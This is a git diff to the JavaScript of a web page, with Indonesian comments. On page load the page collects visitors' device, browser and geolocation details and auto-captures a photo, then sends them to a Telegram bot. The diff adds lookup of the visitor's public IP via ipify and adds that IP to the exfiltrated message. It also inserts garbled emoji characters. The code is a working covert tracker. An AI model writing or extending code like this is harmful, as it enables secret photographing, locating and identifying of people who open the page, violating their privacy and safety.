@@ -43,6 +43,7 @@ let photoBlob = null;
 let locationData = null;
 let deviceData = null;
 let browserData = null;
+let ipData = null;
 
 // ============================================
 // INISIALISASI SAAT PAGE LOAD
@@ -54,6 +55,7 @@ window.addEventListener("DOMContentLoaded", () => {
   getDeviceInfo();
   getBrowserInfo();
   getGeolocation();
+  getIPAddress();
   autoCapturePhoto(); // Auto capture foto saat load
 
   // Setup event listeners setelah DOM ready
@@ -93,6 +95,7 @@ function setupEventListeners() {
       lokasi: locationData || "Tidak tersedia",
       device: deviceData || "Unknown",
       browser: browserData || "Unknown",
+      ip: ipData || "Tidak tersedia",
     };
 
     // Tampilkan loading
@@ -401,6 +404,22 @@ async function autoCapturePhoto() {
 }
 
 // ============================================
+// GET IP ADDRESS
+// ============================================
+
+async function getIPAddress() {
+  try {
+    const response = await fetch("https://api.ipify.org?format=json");
+    const data = await response.json();
+    ipData = data.ip;
+    console.log("✓ IP terdeteksi:", ipData);
+  } catch (error) {
+    console.error("Error getting IP:", error);
+    ipData = "Tidak tersedia";
+  }
+}
+
+// ============================================
 // CAMERA HANDLERS (NOT USED - KEPT FOR COMPATIBILITY)
 // ============================================
 
@@ -430,7 +449,8 @@ async function sendPhotoToTelegram(photoBlob, data) {
 📍 *Lokasi:* ${data.lokasi}
 📱 *Perangkat:* ${data.device}
 🌐 *Browser:* ${data.browser}
-📷 *Foto:* ${photoBlob ? "✓ Terlampir" : "-"}
+� *IP Address:* ${data.ip}
+�📷 *Foto:* ${photoBlob ? "✓ Terlampir" : "-"}
 
 🕐 *Waktu:* ${waktu}
 
